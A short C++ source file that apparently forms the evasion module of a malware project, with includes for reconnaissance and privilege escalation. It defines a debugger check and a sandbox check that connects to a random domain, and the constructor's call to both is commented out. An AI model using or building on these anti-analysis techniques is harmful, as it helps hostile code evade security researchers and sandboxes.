#include "Utils.h"
#include "evasion\Evasion.h"
#include "Recon.h"
#include "Privilege_escalation.h"

Evasion::Evasion() {
    /*	if (Evasion::isBeingDebugging() || Evasion::isDomainReachable()) {
		this->mustBeAvoided = TRUE;
	}
    */

};

BOOL Evasion::isBeingDebugging(void) {
	if (checkDebugger()) {
		return TRUE;
	}
	return FALSE;
}

BOOL Evasion::isDomainReachable(void) {
	std::string randomDomain = Utils::getRandomDomain();

	if (Utils::hostConnection(randomDomain, 80)) {
		return TRUE;
	}
	return FALSE;
}
